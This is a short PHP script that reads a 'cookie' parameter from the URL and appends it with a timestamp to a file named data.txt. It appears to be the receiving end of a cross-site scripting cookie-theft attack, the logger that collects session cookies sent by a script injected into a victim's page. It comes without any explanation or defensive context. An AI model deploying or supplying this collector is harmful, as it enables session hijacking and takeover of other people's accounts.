<?php
if (isset($_GET['cookie'])) {
  $file = fopen("data.txt", "a+");
  $cookie = htmlspecialchars($_GET['cookie']);
  $date = date("Y-m-d H:i:s");
  fwrite($file, "[$date] $cookie\n");
  fclose($file);
}
?>
